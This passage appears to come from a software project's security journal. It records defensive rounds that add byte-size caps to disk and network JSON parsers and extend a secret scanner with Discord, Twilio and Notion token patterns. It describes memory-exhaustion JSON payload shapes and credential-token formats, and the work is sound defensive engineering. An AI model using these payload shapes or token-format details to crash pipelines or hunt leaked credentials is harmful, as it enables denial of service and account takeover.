`CalledProcessError` and aborts the WHOLE cron pipeline, identical blast radius to the on-disk Round 1–3 closures. Site #1 is the canonical entry point for the `update_vor_cache` flow (executed daily); sites #2 and #3 fan out across every station ID in `stations.json` (~150 calls per refresh), so a single poisoned response anywhere in that fan-out aborts the entire batch refresh and skips every subsequent station's resolution.

**Learning:** Rounds 1–3 closed the on-disk axis by walking every `json.load`/`json.loads` site against the byte-size cap; the analogous walk against `session.\(get\|post\)` (or `requests.get`/`requests.post`) sites paired with `.json()`/`.text` was deferred — and Round 4 is the closing-checklist completion for that named-but-deferred class. Same recursive meta-pattern as Round 5 of the depth-bomb family (Round 4 named sixteen sites, programmatic walker found two more), Round 2 of secret-scanner drift (Round 1 named JWT/HF/DO/GitLab-trigger but Twilio/Notion siblings stayed open), Round 3 of the on-disk size-bomb family (Round 2 closed `src/`, deferred `scripts/`). The right closure for the size-bomb family across BOTH axes is "every parser that reads a JSON document — whether sourced from disk via `json.load` OR from the network via `response.json()`/`json.loads(response.content)` — MUST have a byte-size cap fired BEFORE the body is buffered". For network responses, the canonical helper is `src.utils.http.read_response_safe` (which `request_safe`/`fetch_content_safe` already integrate via `MAX_PAYLOAD_SIZE = 10 MiB`); the fix shape for any direct `session.get/post` call site is `stream=True` + `read_response_safe(resp, max_bytes=...)` + `json.loads(content.decode("utf-8"))`. Each script also exposes its own `MAX_VOR_API_RESPONSE_BYTES = 10 * 1024 * 1024` module-level constant (mirrors the `MAX_*_FILE_BYTES` pattern from Round 1–3) so the auto-discoverable inventory test catches any future loader added without the cap. The `read_response_safe` helper enforces the cap via TWO mechanisms — a `Content-Length` pre-check (rejects the response BEFORE `iter_content` runs) AND a streaming-byte-budget tally on `iter_content` (rejects mid-stream once the running tally exceeds the cap; covers the chunked-transfer-encoding case where Content-Length is omitted) — so the cap fires regardless of how the upstream advertises its body size. Combined with Round 1–3's 27 on-disk loaders, the canonical inventory now stands at **30 covered parsers** (27 disk + 3 network) across 15 modules. The `places/client.py` direct-`session.post` site (line 406) was already correct (it streams + uses `read_response_safe` at line 423) and was excluded from this round's deferred-set list to keep the verdict accurate.

**Prevention:** Two reinforcing rules:
  (a) **Two-axis size-bomb audit rule**: every JSON parser MUST have a byte-size cap regardless of input source — disk (`json.load`/`json.loads(path.read_text())`) AND network (`response.json()`/`json.loads(response.content)`/`response.text`). Walking only the on-disk axis is the multi-round drift Round 1–3 closed; this Round 4 closes the orthogonal network axis. The audit grep is two-pass: pass 1 enumerates every disk parser via `git grep -nE 'json\.loads?\(' src/ scripts/`; pass 2 enumerates every network parser via `git grep -nE 'session\.(get\|post\|put\|patch\|delete)\(' src/ scripts/` filtered against sites that bypass `request_safe`/`fetch_content_safe`. The closing condition: every match in either pass either uses the canonical safe wrapper (`request_safe`/`fetch_content_safe` for network; `read_capped_json` for disk) OR exposes a per-loader `MAX_*_BYTES` constant tracked in the inventory test.
  (b) **Direct-`session.get/post` audit rule**: any `session.\(get\|post\)` call that does NOT route through `request_safe`/`fetch_content_safe` is a candidate drift site for FOUR orthogonal protections — (i) byte-size cap (this round's axis), (ii) SSRF/DNS-rebinding via `verify_response_ip`, (iii) Slowloris baseline timeout, (iv) sensitive-header stripping on redirect. Round 4 closes only the byte-size axis to keep scope minimal, but a future audit round MUST walk the same three sites against the other three protections. The auto-discoverable shape: `tests/test_sentinel_json_size_bomb_network.py:test_session_call_uses_stream_true` — an AST static check that pins `stream=True` on every fixed call site, so a future PR that drops the streaming kwarg silently re-introduces the pre-fix vulnerability and fails the test at PR-review time.

The fix shape: each call site adds `stream=True`, threads the response through `src.utils.http.read_response_safe(resp, max_bytes=MAX_VOR_API_RESPONSE_BYTES, timeout=...)`, then either decodes-then-regex-scans (`fetch_access_id`, plain text) or `json.loads(content.decode("utf-8"))` (`fetch_candidates`, `fetch_vor_stops_from_api`, JSON). The cap-fire surfaces as `ValueError` which the existing `except (ValueError, RecursionError)` handlers catch — so the per-station/per-name loops in `main` continue uninterrupted. PoC tests for every site exercise BOTH the `Content-Length`-advertised path AND the chunked-transfer-encoding path (no Content-Length, streaming tally fires). The auto-discoverable invariants live in `tests/test_sentinel_json_size_bomb_network.py`'s twelve tests — one precondition pin on `read_response_safe`/`MAX_PAYLOAD_SIZE`, two inventory tests on `MAX_VOR_API_RESPONSE_BYTES`, three AST static checks on `stream=True`, three behavioural PoC tests on Content-Length rejection, one streaming-cap PoC, and three normal-case regressions.

## 2026-05-08 - JSON Size-Bomb Drift Round 3: Round 2's `src/`-Only Closure Explicitly Deferred 16 `scripts/` On-Disk Parsers
**Vulnerability:** The 2026-05-08 Round 2 of JSON size-bomb defences closed eleven on-disk JSON parsers across `src/` and explicitly deferred the `scripts/` tree to "Round 3 with structural roadmap to keep this PR scoped" — its verdict line said *"every script-level on-disk parser also needs the same cap, but the closing checklist for this round is `src/`-only"*. Re-running the inverse enumeration grep (`git grep -nE 'json\.loads?\(' scripts/` paired with the on-disk filter) returned **sixteen open sites** across eight scripts whose loaders shared the canonical depth-bomb catch tuple but lacked the byte-size cap: (1) `scripts/enrich_station_aliases.py:_load_vor_mapping`, (2) `_load_pendler_alternative_names`, (3) `main` (operator-supplied stations); (4) `scripts/fetch_vor_haltestellen.py:load_stations`, (5) `load_pendler_candidate_names`; (6) `scripts/update_all_stations.py:_load_stations` (post-merge heartbeat input), (7) `_count_polygon_vertices` (heartbeat-time polygon counter); (8) `scripts/update_baustellen_cache.py:_load_fallback` (network-unreachable failover); (9) `scripts/update_station_directory.py:_load_existing_station_entries`, (10) `_load_vor_name_to_id_map`, (11) `load_pendler_station_ids`, (12) `load_pendler_name_candidates`; (13) `scripts/update_vor_stations.py:merge_into_stations` (existing-state stations.json); (14) `scripts/update_wl_stations.py:load_vor_mapping`, (15) `merge_into_stations`; (16) `scripts/validate_vor_mapping.py:main`. Every site shares the same `MemoryError`-is-`BaseException` propagation: pre-fix, a wide-but-flat planted file (~1 GiB of `[0,0,…]`) buffered into memory via `json.load(handle)` / `path.read_text()`; the resulting `MemoryError` propagated past the surrounding `except (OSError, json.JSONDecodeError, RecursionError)` handler and crashed each script. Severity MEDIUM-HIGH because the orchestrator (`scripts/update_all_stations.py`) runs every update script via `subprocess.run(check=True)` — an unhandled `MemoryError` raises `CalledProcessError` and aborts the WHOLE cron pipeline, not just the offending step. Sites #6/#7 are particularly insidious: the orchestrator calls them at heartbeat-build time AFTER the merged stations.json has already been atomically written, so a wide-but-flat planted file crashes `_build_heartbeat → main()` and leaves partial state with no heartbeat record (masking the real cause). Site #8 (the bundled baustellen fallback) is the network-unreachable failover path — a planted-huge fallback denies BOTH fetch AND fallback simultaneously when the upstream is also down.

**Learning:** Round 2 explicitly named the `scripts/` tree as deferred work with structural roadmap, and Round 3 closes the deferred set in full. This closes the "deferred to next round" bucket from Round 2's three-bucket closing-checklist split. The fix shape canonicalises a SHARED helper at `src/utils/files.py:read_capped_json(path, max_bytes, *, label, logger)` that combines the byte-size cap with the depth-bomb catch tuple in one place — every script imports it instead of re-implementing the pattern, eliminating the per-site drift surface. Each script also exposes its own `MAX_JSON_FILE_BYTES = 50 * 1024 * 1024` module-level constant (50 MiB cap, ~285x the production stations.json ~175 KiB) so the auto-discoverable inventory test (`tests/test_sentinel_json_size_bomb_ondisk_round3.py:test_canonical_size_cap_constants_inventory_round3`) catches any future loader added without the cap. Combined with Round 1's three modules and Round 2's five modules, the canonical inventory now stands at **27 covered loaders across 13 modules** (`cache.py:3`, `quota.py:1`, `tiling.py:1`, `stations.py:2`, `merge.py:1`, `stations_validation.py:1`, `build_feed.py:2`, plus the eight `scripts/` modules). The shared-helper pattern matters because the closing-checklist meta-pattern this entry documents (Round 1 named 5 sites, Round 2 found 6 more in `src/`, Round 3 found 16 more in `scripts/`) is itself recursive — every audit round so far has found a non-empty deferred set after the prior round's stated closure. A shared helper takes the per-site copy-paste drift surface off the table: future loaders use the helper or fail the inventory test.

**Prevention:** Two reinforcing rules:
  (a) **Shared-helper pattern rule**: when a defence pattern (size-bomb cap, depth-bomb catch, secret redaction, etc.) is applied across more than 5 sites in 3 or more modules, the canonical move is to extract a SHARED helper in a utility module (`src/utils/`) instead of duplicating the implementation. The shared helper becomes the single point of audit AND the single point of failure for future drift. Mirrors the canonical refactor pattern from Round 4-5 of the depth-bomb family (extracted `_safe_load_json` to `src/utils/files.py`-style location).
  (b) **`scripts/`-tree audit rule**: every JSON-related defence round MUST walk the `scripts/` tree alongside `src/`. Pre-existing rounds limited audits to `src/` because mypy is configured `files = ["src"]` and ruff `target-version = "py311"` doesn't differentiate, but the runtime blast radius (cron pipeline running `scripts/*.py` via `subprocess.run`) is identical. The structural rule: every grep-audit step MUST pair `git grep ... src/` with `git grep ... scripts/`. Silent deferrals of the `scripts/` half create the multi-round drift this entry documents.

The fix shape: each scripts-tree loader becomes `data = read_capped_json(path, MAX_JSON_FILE_BYTES, label=...); if data is None: return CANONICAL_FALLBACK`. PoC tests for every site assert `mock_load.assert_not_called()` proves the size cap fires BEFORE `json.load` is invoked (stat-first contract), plus per-script sanity tests prove normal-sized files still parse correctly. The auto-discoverable invariant lives in the inventory test that enumerates every script + cap-constant pair.

## 2026-05-08 - JSON Size-Bomb Drift Round 2: Round 1's Five-Site Closure Left Six Sibling On-Disk Parsers Open in `src/`
**Vulnerability:** The 2026-05-08 Round 1 of JSON size-bomb defences canonicalised the "stat-then-cap-then-read" pattern for FIVE on-disk JSON parsers — `src/utils/cache.py` (`read_cache`, `read_status`, `write_cache`'s data-degradation guard), `src/places/quota.py:MonthlyQuota.load`, `src/places/tiling.py:load_tiles_from_file` — and pinned the canonical safe-parser contract: every on-disk JSON parser MUST have BOTH a depth-bomb catch (`RecursionError` in the except tuple) AND a size cap (`stat().st_size` check before `open()`/`read_text()`). Re-running the inverse enumeration grep (`git grep -nE 'json\.loads\(|json\.load\(' src/` paired with "not preceded by `stat\(\).st_size`") returned **six further open sites in `src/`** whose loaders shared the canonical depth-bomb catch tuple `except (json.JSONDecodeError, RecursionError)` but lacked the byte-size cap: (1) `src/utils/stations.py:_station_entries:411` — module-level `@lru_cache` loader for `data/stations.json`, called from EVERY station-name lookup repo-wide (`canonical_name`, `station_info`, `station_by_oebb_id`, `vor_station_ids`, `is_in_vienna`); (2) `src/utils/stations.py:_vienna_polygons:251` — module-level `@lru_cache` loader for `data/LANDESGRENZEOGD.json`, called from `is_in_vienna(lat, lon)`; (3) `src/places/merge.py:load_stations:70` — operator-supplied stations file passed via `update_station_directory.py` CLI; (4) `src/build_feed.py:_load_state:628` — orchestrator's load of `data/first_seen.json` cross-run dedup state, the FIRST disk read of every cron run; (5) `src/build_feed.py:_save_state:690` data-merge guard — reads the existing state file under exclusive lock before overwriting; (6) `src/utils/stations_validation.py:_load_stations:256` — operator-supplied stations file via `scripts/validate_stations.py`. All six sites share the same `MemoryError`-is-`BaseException` propagation: pre-fix, a 1 GiB stations.json (or polygon, or state file) buffered into memory via `json.load(handle)` / `path.read_text()`; the resulting `MemoryError` propagated past the surrounding handler and crashed every downstream caller. Sites #1 and #2 are CRITICAL: module-level `@lru_cache` loaders running at import time, so the planted-huge file crashes EVERY feed-build path that touches a station name OR a Vienna geo-fence check. Sites #4 and #5 are HIGH: the orchestrator's first/last disk read, so a poisoned state file crashes the cron BEFORE any provider runs (load) or DURING the save merge step (mid-write crash leaves partial state with no recovery). Severity MEDIUM-HIGH (same threat actor as Round 1 — compromised CI runner / partial flush + power loss / corrupted previous run).

**Learning:** Round 1's "five-site closure" verdict scoped the fix to the three modules the round was actively touching (`cache.py`, `quota.py`, `tiling.py`), but the inverse enumeration grep documented in the same round's prevention rule still returned non-empty. Same recursive meta-pattern as JSON Depth-Bomb Round 5 (Round 4 named sixteen sites, programmatic walker found two more), Round 2 of secret-scanner drift (Round 1 named five issuers, audit walked four), Round 7 of env-cap drift (Round 6 named `LOG_BACKUP_COUNT` but deferred). The right closure for the size-bomb family is "every on-disk JSON parser in `src/` has either a per-loader `MAX_*_FILE_BYTES` constant exposed on its module OR a documented justification in the round's verdict line." This Round 2 closes the six remaining `src/` sites; the canonical inventory now stands at **eleven covered loaders across five modules** (`cache.py:3`, `quota.py:1`, `tiling.py:1`, `stations.py:2`, `merge.py:1`, `stations_validation.py:1`, `build_feed.py:2`). The `scripts/` tree (~20 sibling parsers) is explicitly deferred to Round 3 with structural roadmap: every script-level on-disk parser also needs the same cap, but the closing checklist for this round is `src/`-only to keep the PR scoped. The auto-discoverable invariant lives in `tests/test_sentinel_json_size_bomb_ondisk_round2.py`'s `test_canonical_size_cap_constants_inventory` — a single inventory test that asserts every covered loader's module exposes the expected `MAX_*_FILE_BYTES` constant. A future PR that adds a new on-disk JSON loader without the cap fails the inventory test at PR-review time.

**Prevention:** Two reinforcing rules:
  (a) **Programmatic-walker closing rule** (Round 1 reinforcement made permanent): when a size-bomb / depth-bomb / clear-text-logging round closes, the verdict line MUST cite the *output* of the inverse enumeration grep (e.g., `git grep -nE 'json\.loads\(|json\.load\(' src/` filtered by "not preceded by `stat\(\).st_size`"), not just the list of sites the fix actually touched. If the grep output is non-empty, the round is not done — extend the fix or document each remaining site with an explicit deferred-fix journal note. The auto-discoverable shape is the **inventory test** pattern: a single test that enumerates every covered loader's `(module, MAX_*_FILE_BYTES)` pair and asserts each is exposed and positive. Mirrors `tests/test_sentinel_json_audit_walker.py`'s programmatic walker for the depth-bomb axis but on a different attribute (size cap instead of `RecursionError` in the catch tuple).
  (b) **Module-level `@lru_cache` loader audit rule**: every `@lru_cache(maxsize=1)`-decorated function that loads state from disk has IMPORT-TIME blast radius — its callers (every station lookup, every geo-fence check, every metadata query) consume the cached result via the function's first call, and a propagated `MemoryError` / `RecursionError` from that first call kills every downstream path that touches the cached value. The rule: every `@lru_cache`-decorated loader MUST follow the canonical safe-parser contract (depth + size + structure validation) so a poisoned file degrades gracefully (return empty tuple/dict) instead of crashing the import chain. Sites #1 (`_station_entries`) and #2 (`_vienna_polygons`) in this round are the canonical examples; future audits should grep `^@lru_cache` paired with `json\.loads\(|json\.load\(` in the same function body to enumerate the family.

The fix shape mirrors Round 1's `513dcb4` / Round 4-5 of the depth-bomb family: stat the file, compare to a per-loader `MAX_*_FILE_BYTES` constant, raise `ValueError` (for `merge.py` whose caller already handles ValueError) / `StationValidationError` (for `stations_validation.py`) / treat as missing/unreadable (for `stations.py` and `build_feed.py` which already return empty/{}/None on parse failure). The two `stations.py` loaders share a new private helper `_read_capped_json(path, max_bytes, label=...)` that combines the size cap, file open, depth-bomb catch tuple, and graceful-fallback return — extracting it keeps both `_vienna_polygons` and `_station_entries` at their pre-fix C901 complexity (21 and unchanged respectively) and makes the canonical safe-parser pattern reusable for any future loader added to this module.

## 2026-05-08 - JSON Size-Bomb Drift: The Depth-Bomb Catch Tuple Does Not Cover Wide-but-Flat Memory-Exhaustion Bombs
**Vulnerability:** The 2026-05-08 / 2026-05-07 rounds of JSON depth-bomb defences canonicalised `except (json.JSONDecodeError, RecursionError)` for every on-disk JSON parser in `src/utils/cache.py` (`read_cache`, `read_status`, `write_cache`'s data-degradation guard), `src/places/quota.py:MonthlyQuota.load`, `src/places/tiling.py:load_tiles_from_file`, and ~30 sibling sites repo-wide. The depth-bomb attack shape — `[[[[[…]]]]]`, ~5000-deep — was pinned as the canonical threat. But re-running the threat-modelling against the SAME on-disk parsers surfaced a structurally-orthogonal attack class that slips past every prior round's catch tuple: a **wide-but-shallow** JSON document such as `[1, 1, 1, … (50 million times) … 1]`. Three reasons the depth-bomb catch is insufficient: (a) `json.loads` does NOT raise `RecursionError` on a flat list regardless of length — only nested structures hit the recursion limit; (b) `path.read_text(encoding="utf-8")` (used in `quota.py` / `tiling.py`) and `json.load(fh)` (used in `cache.py`) BOTH buffer the entire file before parsing — a 1 GiB file allocates a 1 GiB Python string plus another ~5 GiB worth of `int`/`list`/`dict` objects after parse; (c) the resulting `MemoryError` is a `BaseException` subclass — it is NOT caught by any of the surrounding `except (OSError, json.JSONDecodeError, RecursionError)` handlers, so the unhandled exception escapes the loader, propagates past the feed orchestrator's main `try` block, and crashes the entire cron-driven build. Severity MEDIUM-HIGH (planted by a compromised CI runner / partial flush after power loss / corrupted previous run; same threat actor model as the depth-bomb family). Sites closed in this round: (1) `src/utils/cache.py:read_cache:152` — `cache_file.open("r")` + `json.load(fh)` with no upstream stat; (2) `src/utils/cache.py:read_status:372` — same shape for `last_run.json`; (3) `src/utils/cache.py:write_cache:281` data-degradation guard — reads existing cache before the new payload write, planted-huge attacker poisons the guard; (4) `src/places/quota.py:MonthlyQuota.load:99` — `path.read_text()` then `json.loads`, double-allocation; (5) `src/places/tiling.py:load_tiles_from_file:94` — same shape for tile config. The five sites share the canonical "stat-then-cap-then-read" defensive pattern.

**Learning:** The structural lesson is that the depth-bomb catch tuple is necessary but not sufficient — the canonical "safe on-disk JSON parser" contract MUST include both axes: depth bound (caught via `RecursionError`) AND size bound (caught via byte-size cap on `stat().st_size` BEFORE `open()`/`read_text()`). The two axes are orthogonal (a 1 GiB file may have depth 1; a 5000-deep file may be a few KiB), so neither defence subsumes the other. The byte-size cap must fire BEFORE the file is opened — not after — because a `read_text()` call has already buffered the full file by the time `json.loads` runs. The per-loader cap is sized at ~100x the largest legitimate file shape (50 MiB for `cache.py` events / status, 1 MiB for `quota.py` state, 1 MiB for `tiling.py` config) so the cap does NOT introduce a false-positive rejection of valid state. The `MemoryError`-is-`BaseException` finding is the same family as the `OverflowError`-out-of-`timedelta` finding in the env-cap drift family (Round 6/7 of `MAX_LOG_PRUNE_KEEP_DAYS` / `MAX_PRUNE_CACHE_MAX_AGE_HOURS`): both are exception classes that propagate past the surrounding `except OSError` handler because they're rooted at `BaseException`, not at the relevant domain exception, so the canonical "sink-side cap" is the only place where the bound can be enforced. The auto-discoverable invariant lives in `tests/test_sentinel_json_size_bomb_ondisk.py` extended with seven new tests — one precondition pin on the cap-constant existence (`MAX_CACHE_FILE_BYTES`/`MAX_QUOTA_FILE_BYTES`/`MAX_TILE_FILE_BYTES` are exposed and within bounds), one mock-load-not-called test per cache.py site (proves the size cap fires BEFORE `json.load` is invoked), one ValueError-raised test per quota.py / tiling.py site (proves the cap surfaces a clean ValueError instead of MemoryError), and one regression test that pins normal-sized files are unaffected.

**Prevention:** Two reinforcing rules:
  (a) **Two-axes on-disk-parser audit rule**: every on-disk JSON parser MUST have BOTH a depth-bomb catch (`RecursionError` in the except tuple) AND a size cap (`stat().st_size` check before `open()`/`read_text()`) — the depth bound and size bound are orthogonal, neither subsumes the other. Walking only one axis is the multi-round drift the previous depth-bomb rounds documented (Round 1-5); this round closes the orthogonal size-bound axis. The `MAX_*_FILE_BYTES` constant must be sized at 100x the largest legitimate file shape so production state is never rejected.
  (b) **BaseException-rooted exception classes audit rule**: when the audit identifies a fail-mode exception that the existing handler does NOT catch, check whether the exception is rooted at `BaseException` (e.g. `MemoryError`, `OverflowError`, `RecursionError`, `KeyboardInterrupt`, `SystemExit`). For `BaseException`-rooted classes the canonical fix is sink-side prevention (cap input size, cap stack depth, cap allocation budget) — adding the class to the `except` tuple is materially different from the typical `Exception`-rooted catch and may regress the surrounding error-recovery contract. The shape lives in `tests/test_sentinel_json_size_bomb_ondisk.py:test_*_rejects_oversized_file` per-site.

The fix shape mirrors `513dcb4` / `55009db` / Round 4-5 of the depth-bomb family: stat the file, compare to a per-loader `MAX_*_FILE_BYTES` constant, raise `ValueError` (for `quota.py` / `tiling.py` whose callers already handle ValueError) or treat as missing/unreadable (for `cache.py` which already returns `[]` / `None` on parse failure). The auto-discoverable invariant for future audits is the existence of the cap constant — any future on-disk parser added without one fails the precondition test.

## 2026-05-08 - Secret-Scanner Drift Round 3: Discord Bot Token Closes the Round 2 "Deferred to Next Round with Structural Pattern Roadmap" Bucket
**Vulnerability:** The 2026-05-08 Round 2 entry split the issuer-keyed taxonomy's deferred set into three buckets — "added in this round" (Twilio Account SID, Twilio API Key SID, Notion legacy `secret_`, Notion modern `ntn_`), "deferred with no-specific-pattern justification" (Datadog 32-/40-char hex with no prefix, Cloudflare 40-char `[A-Za-z0-9_-]` with no prefix, Atlassian 24-char alphanumeric with no prefix — all three lack a unique high-entropy prefix and would produce too many false positives without a structural disambiguator like a request-host check), and "deferred to next round with structural pattern roadmap" (Discord bot tokens). The single explicitly-carried-forward item from Round 2's three-bucket split was Discord — a 3-segment dot-separated token whose canonical format `<base64url(user-id)>.<base64url(timestamp)>.<HMAC>` mirrors the JWT structural shape that the same audit family (Round 1 of secret-scanner drift) already pinned. Pre-fix, a leaked Discord bot token in a committed config / notebook / log artefact would only be flagged by the entropy fallback or `_SENSITIVE_ASSIGN_RE` as a generic "Verdächtige Zuweisung eines potentiellen Secrets" — losing both the issuer-specific reason (Discord's revocation flow lives at https://discord.com/developers/applications/, distinct from any other vendor's) and the full-token span needed to feed the bot-token-rotation playbook. The dots are outside the entropy fallback's `[A-Za-z0-9+/=_-]` alphabet (same alphabet-collision shape as JWT/SendGrid), so only ONE segment is matched at a time — incident response would chase a 27-char HMAC tail without knowing which of the bot's authorised guilds is at risk. Severity HIGH for any project that ever shipped a Discord-integrated bot: the leaked token grants FULL bot privileges in every guild the bot is invited to (read/write all visible messages, kick/ban users, edit channels and roles, run any registered slash commands, with appropriate scopes read voice/DM history). The Discord disambiguator from JWT is at the leading-character level: Discord stringifies the user ID (decimal digits) before base64-encoding it, so the first segment ALWAYS starts with `[MNO]` (decimal `1`-`3`→`M`, `4`-`7`→`N`, `8`-`9`→`O`); JWTs ALWAYS start with `eyJ` (base64 encoding of `{"`, the start of every JOSE JSON header). The two leading-character classes are disjoint, so no token can match both patterns — mutual exclusion is structural, not order-dependent.

**Learning:** Round 2's three-bucket split (added / no-specific-pattern-feasible / deferred-to-next-round) is the closing-checklist meta-pattern that the issuer-keyed taxonomy completion rule REQUIRES — and the "deferred to next round" bucket has exactly one canonical resident (Discord) because it's the only remaining named-but-deferred multi-segment issuer whose canonical format bypasses the entropy fallback's alphabet via dot separators. The three other named-but-deferred issuers (Datadog/Cloudflare/Atlassian) all sit permanently in the "no specific pattern feasible" bucket — their canonical formats lack a unique high-entropy prefix, so adding a strict pattern would either over-flag or under-flag depending on body-length tuning; the entropy fallback is the documented coverage of last resort and the right answer for that bucket is "leave them in entropy-fallback coverage forever". This Round 3 closes the issuer-keyed taxonomy completion rule for the multi-segment dot-separated family by enumerating ALL named formats: JWT (Round 1, `eyJ`-prefixed), SendGrid (pre-Round 1, `SG.`-prefixed), and now Discord (Round 3, `[MNO]`-prefixed). The auto-discoverable invariant lives in `tests/test_sentinel_secret_scanner_drift.py` extended with five new tests — one PoC for `M`-prefixed bot tokens, one PoC for `N`-prefixed bot tokens (proves `[MNO]` is not over-narrow), two cross-mutex tests (JWT MUST NOT misattribute as Discord; Discord MUST NOT misattribute as JWT), and one negative-case test (short three-segment strings like `M.6.27` MUST NOT match the strict 24+/6/27+ body-length quantifiers). Combined with all prior rounds, `_KNOWN_TOKENS` now carries **28 specific issuer patterns** plus the generic high-entropy and bearer-shape fallbacks.

**Prevention:** Two reinforcing rules:
  (a) **Three-bucket closing-checklist rule** (Round 2 reinforcement made permanent): every secret-scanner drift round's verdict line MUST split deferred issuers into exactly three buckets — "added in this round", "deferred with no-specific-pattern justification" (each with the structural reason: prefix collision / body too generic / no unique high-entropy prefix), and "deferred to next round with structural pattern roadmap" (each with the named pattern shape and the round number where it'll land). Silent deferrals (the bucket-(c) failure mode) created the multi-round drift documented in Rounds 1-3 of this family. The next round's audit MUST close every bucket-(c) entry from the prior round OR explicitly relegate it to bucket-(b) with the structural reason — the family closes when bucket-(c) is empty AND every prior bucket-(c) entry is in bucket-(a) or bucket-(b).
  (b) **Multi-segment dot-separated issuer enumeration rule**: when a token format uses dots as inter-segment separators (JWT, SendGrid, Discord, and the future canonical examples), the entropy fallback's `[A-Za-z0-9+/=_-]` alphabet always misses the cross-segment span, so a specific pattern is mandatory — never deferrable to the entropy fallback. The shape lives in `tests/test_sentinel_secret_scanner_drift.py:test_secret_scanner_does_not_misattribute_*` cross-mutex tests: every NEW multi-segment dot-separated issuer added to `_KNOWN_TOKENS` MUST have a pair of cross-mutex tests asserting (i) other dot-separated issuers do NOT misattribute as the new issuer and (ii) the new issuer does NOT misattribute as other dot-separated issuers. The leading-character constraint is the canonical disambiguator: JWT (`eyJ`-prefixed), SendGrid (`SG.`-prefixed), Discord (`[MNO]`-prefixed) — each issuer's leading character class is disjoint from the others.

The fix shape mirrors `9c4e666` / `0fab06b`: append a per-issuer regex tuple to `_KNOWN_TOKENS` with anchored word-boundary lookbehinds/lookaheads (`(?<![A-Za-z0-9])` / `(?![A-Za-z0-9])`) and strict body-length quantifiers; per-issuer reason string is German-language to match the existing taxonomy.

## 2026-05-08 - Secret-Scanner Drift Round 2: Twilio + Notion Issuers Named in Round 1's Prevention Rule but Never Enumerated
**Vulnerability:** The 2026-05-08 secret-scanner-drift round (`9c4e666`) added JWT, Hugging Face, DigitalOcean PAT/refresh, and GitLab Pipeline Trigger Token detectors to `_KNOWN_TOKENS`. Its prevention rule named **"the broader issuer landscape (JWT — the most common cred format in modern web; HF/DO/GitLab-trigger — increasingly common Python project deps) was named in passing but never enumerated"** and then enumerated the still-open issuer set as: "(JWT, HF, DO, GitLab variants, **Twilio, Datadog, Cloudflare, Atlassian, Notion**)". Round 1 closed JWT/HF/DO/GitLab-trigger but stopped at the named subset, leaving four issuer classes still without specific patterns. Re-running the issuer-keyed taxonomy walk against the remaining named set surfaced two issuers whose token formats are *unambiguous* (specific prefix + strict body structure, low false-positive risk):

1. **Twilio Account SID (`AC<32 hex>`) and API Key SID (`SK<32 hex>`)** — Twilio's documented SID format is a 2-letter resource-type prefix followed by 32 lowercase hex chars (https://www.twilio.com/docs/glossary/what-is-a-sid). The Account SID is the principal credential — pairs with the Auth Token to authenticate every API call (call/SMS history, billing, phone-number provisioning) — so a leak grants the entire blast radius of the project. The API Key SID pairs with a separate scoped secret. Pre-fix the entropy fallback `[A-Za-z0-9+/=_-]{24,}` *would* match the 32-hex body, but only as a generic "Hochentropischer Token-String" — losing the issuer-specific reason that incident-response playbooks key off (Twilio's revocation flow lives on twilio.com and is distinct from any other vendor's). The case + separator difference between Stripe `sk_live_`/`sk_test_` (lowercase + underscore) and Twilio `SK<hex>` (uppercase + immediate hex) is the only thing keeping the two patterns mutually exclusive — a regression-test parametrises both forms to pin that boundary. Severity MEDIUM (issuer-attribution gap; tokens still flagged generically, but rotation playbook is wrong).

2. **Notion Integration Tokens (legacy `secret_<43 alphanumeric>` and modern `ntn_<43+ chars>`)** — Notion API tokens are issued via developer integrations at https://www.notion.so/my-integrations and grant read/write access to whatever workspace content the integration is shared with: full database/page contents, including any private collaborator notes. Two formats coexist post-2024-09 API rollout (legacy `secret_` and modern `ntn_`); both have the same blast radius but distinct revocation paths, so distinct attribution matters. The legacy `secret_` prefix is interesting because the underscore is INSIDE the entropy fallback's `[A-Za-z0-9+/=_-]` alphabet — so the entropy detector *would* match the full token as a single span, but only as a generic high-entropy hit, losing the Notion-specific issuer attribution. The strict 43-char alphanumeric body length avoids colliding with operator-set `SECRET_KEY = "..."` variable assignments that the broader `_SENSITIVE_ASSIGN_RE` already captures. Severity MEDIUM.

The other three named-but-deferred issuers (Datadog, Cloudflare, Atlassian) have token formats that lack a unique high-entropy prefix: Datadog API/app keys are 32-/40-char hex with no prefix, Cloudflare modern API tokens are 40-char `[A-Za-z0-9_-]` with no prefix, and Atlassian API tokens are 24-char alphanumeric with no prefix. All three would produce too many false positives without a structural disambiguator (e.g., "appears in a request to api.datadoghq.com"); the canonical defensive pattern for those is the entropy fallback we already have. Discord bot tokens (named in Round 1's "Each multi-segment dot-separated format (JWT, SendGrid, Discord) MUST get its own pattern" rule) is a 3-segment dot-separated token like JWT — *that* one is reachable via a strict pattern but is deferred to a follow-up round to keep this PR focused on the four highest-confidence additions.

**Learning:** Round 1's prevention rule named five remaining issuer classes as "still missing" and the round committed four (JWT/HF/DO/GitLab-trigger). The closing-checklist methodology was named-list-driven again — the *implementation* matched what the round physically touched, but the *verdict* didn't enumerate the remaining unaddressed siblings as deferred sites. Same recursive meta-pattern as JSON Depth-Bomb Round 5 (Round 4 named sixteen sites, fixed those, but a programmatic walker still found two more), Round 11 of the `timedelta` family (`FRESH_PUBDATE_WINDOW_MIN` named in Round 9/10's remaining-candidates list but deferred until Round 11), Round 7 of the env-cap drift family (`LOG_BACKUP_COUNT` named in Round 6's prevention rule but deferred). The right closure for the issuer-keyed taxonomy family is "every named-but-deferred issuer in the prior round's prevention rule MUST be either added in the next round OR explicitly justified as 'no specific pattern feasible' in the verdict line, with the entropy-fallback as the documented coverage of last resort." Datadog/Cloudflare/Atlassian fall in the latter bucket; Discord-bot-token falls in the former and is explicitly carried forward. The auto-discoverable invariant lives in `tests/test_sentinel_secret_scanner_drift.py` extended with six new tests — two PoC tests per Twilio variant + two PoC tests per Notion variant + one negative-case test per issuer (Twilio: "lowercase ``sk_*`` MUST NOT misattribute as Twilio"; Notion: "short ``secret_<short>`` strings MUST NOT match the Notion pattern's strict 43-char body").

**Prevention:** Two reinforcing rules:
  (a) **Issuer-keyed taxonomy completion rule (Round 2 reinforcement)**: when a secret-scanner drift round names N remaining issuers and adds K patterns, the verdict line MUST split the deferred (N-K) set into two buckets — "added in this round", "deferred with no-specific-pattern justification" (with explicit reason: prefix collision, body too generic, etc.), or "deferred to next round with structural pattern roadmap" (Discord-bot-token is the canonical example here). Silent deferrals create the multi-round drift this entry documents.
